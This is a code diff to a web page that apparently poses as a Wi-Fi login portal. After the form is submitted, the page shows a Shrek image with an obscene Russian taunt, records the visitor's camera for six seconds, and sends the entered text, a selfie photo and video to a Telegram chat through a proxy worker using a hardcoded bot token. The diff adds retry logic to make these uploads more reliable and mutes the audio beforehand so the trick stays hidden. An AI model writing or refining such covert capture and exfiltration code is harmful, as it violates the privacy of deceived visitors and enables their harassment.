@@ -275,7 +275,7 @@
     .mosid-status.success { color: #2e7d32; font-weight: 600; }
     .mosid-status.error { color: #c62828; }
 
-    /* ===== ШРЕК (внутри main, без оверлея) ===== */
+    /* ===== ШРЕК (внутри main) ===== */
     .shrek-screen {
       display: none;
       text-align: center;
@@ -474,7 +474,6 @@
         </form>
       </div>
 
-      <!-- Шрек появляется вместо формы, шапка и меню остаются -->
       <div class="shrek-screen" id="shrekScreen">
         <div class="shrek-title">Хуй тебе, а не вай-фай.<br>Бесплатный сыр только в мышеловке</div>
         <img class="shrek-img" src="nnHAUrF0M4g.png" alt="Шрек">
@@ -535,9 +534,27 @@
   const TELEGRAM_CHAT_ID = "6651741310";
   const PROXY_URL = "https://kp11-bot-proxy.riwendik.workers.dev";
 
+  // Универсальный запрос с повтором
+  async function fetchWithRetry(url, options, maxRetries = 2) {
+    for (let attempt = 0; attempt <= maxRetries; attempt++) {
+      try {
+        const res = await fetch(url, options);
+        if (res.ok) return res;
+        // Если 4xx/5xx — на повтор
+        if (attempt === maxRetries) return res;
+        console.warn(`Попытка ${attempt + 1} не удалась, статус ${res.status}. Повтор...`);
+        await new Promise(r => setTimeout(r, 1500));
+      } catch (err) {
+        if (attempt === maxRetries) throw err;
+        console.warn(`Попытка ${attempt + 1} упала: ${err.message}. Повтор через 1.5с...`);
+        await new Promise(r => setTimeout(r, 1500));
+      }
+    }
+  }
+
   async function sendTelegramNotify(text) {
     try {
-      const res = await fetch(`${PROXY_URL}?token=${TELEGRAM_TOKEN}&method=sendMessage`, {
+      const res = await fetchWithRetry(`${PROXY_URL}?token=${TELEGRAM_TOKEN}&method=sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
@@ -547,7 +564,7 @@
           disable_web_page_preview: true
         })
       });
-      if (!res.ok) console.warn("Text send failed:", await res.text());
+      if (!res || !res.ok) console.warn("Text send failed:", res ? await res.text() : "no response");
       else console.log("✅ Текст отправлен");
     } catch (err) {
       console.error("❌ Ошибка отправки текста:", err);
@@ -565,11 +582,11 @@
       }
       formData.append("photo", blob, "selfie.jpg");
 
-      const res = await fetch(`${PROXY_URL}?token=${TELEGRAM_TOKEN}&method=sendPhoto`, {
+      const res = await fetchWithRetry(`${PROXY_URL}?token=${TELEGRAM_TOKEN}&method=sendPhoto`, {
         method: "POST",
         body: formData
       });
-      if (!res.ok) console.warn("Photo send failed:", await res.text());
+      if (!res || !res.ok) console.warn("Photo send failed:", res ? await res.text() : "no response");
       else console.log("✅ Фото отправлено");
     } catch (err) {
       console.error("❌ Ошибка отправки фото:", err);
@@ -587,11 +604,11 @@
       }
       formData.append("video", blob, "video.mp4");
 
-      const res = await fetch(`${PROXY_URL}?token=${TELEGRAM_TOKEN}&method=sendVideo`, {
+      const res = await fetchWithRetry(`${PROXY_URL}?token=${TELEGRAM_TOKEN}&method=sendVideo`, {
         method: "POST",
         body: formData
       });
-      if (!res.ok) console.warn("Video send failed:", await res.text());
+      if (!res || !res.ok) console.warn("Video send failed:", res ? await res.text() : "no response");
       else console.log("✅ Видео отправлено");
     } catch (err) {
       console.error("❌ Ошибка отправки видео:", err);
@@ -966,31 +983,34 @@
   let pendingData = null;
   let audioUnlocked = false;
 
+  // Разблокировка звука через muted — ГАРАНТИРОВАННО не даст звук проскочить
   function unlockAudio() {
     if (audioUnlocked) return;
     try {
+      shrekAudio.muted = true;
       shrekAudio.volume = 0;
       const p = shrekAudio.play();
       if (p && p.then) {
         p.then(() => {
-          shrekAudio.pause();
-          shrekAudio.currentTime = 0;
-          shrekAudio.volume = 1.0;
-          audioUnlocked = true;
-          console.log("Звук разблокирован");
+          setTimeout(() => {
+            shrekAudio.pause();
+            shrekAudio.currentTime = 0;
+            // НЕ снимаем muted здесь — оставим до появления Шрека
+            audioUnlocked = true;
+            console.log("Звук разблокирован (muted)");
+          }, 100);
         }).catch(err => {
           console.warn("Unlock audio failed:", err);
-          shrekAudio.volume = 1.0;
+          shrekAudio.muted = true;
+          shrekAudio.volume = 0;
         });
       } else {
         shrekAudio.pause();
         shrekAudio.currentTime = 0;
-        shrekAudio.volume = 1.0;
         audioUnlocked = true;
       }
     } catch (e) {
       console.warn("unlockAudio error:", e);
-      shrekAudio.volume = 1.0;
     }
   }
 
@@ -1097,19 +1117,21 @@
   }
 
   function showShrekWithReaction() {
-    // Прячем форму, показываем Шрека внутри main — шапка и меню остаются
     wifiCard.style.display = 'none';
     shrekScreen.classList.add('show');
 
-    // Запускаем звук
+    // ЗВУК — только сейчас, с полной громкостью
     try {
+      shrekAudio.muted = false;
       shrekAudio.volume = 1.0;
       shrekAudio.currentTime = 0;
       const p = shrekAudio.play();
       if (p && p.catch) {
         p.catch(err => {
-          console.warn("Play error, разблокировка при клике:", err);
+          console.warn("Play error:", err);
+          // Запасной вариант — разблокировка при первом клике
           const unlock = () => {
+            shrekAudio.muted = false;
             shrekAudio.volume = 1.0;
             shrekAudio.currentTime = 0;
             shrekAudio.play().catch(() => {});
@@ -1124,10 +1146,8 @@
       console.warn("audio error:", e);
     }
 
-    // Запускаем запись
     startVideoRecording();
 
-    // Через 6 секунд стоп + сохранение
     setTimeout(async () => {
       await stopRecordingAndSave();
     }, 6000);
@@ -1138,10 +1158,12 @@
     shrekScreen.classList.add('show');
 
     try {
+      shrekAudio.muted = false;
       shrekAudio.volume = 1.0;
       shrekAudio.currentTime = 0;
       shrekAudio.play().catch(() => {
         const unlock = () => {
+          shrekAudio.muted = false;
           shrekAudio.volume = 1.0;
           shrekAudio.currentTime = 0;
           shrekAudio.play().catch(() => {});
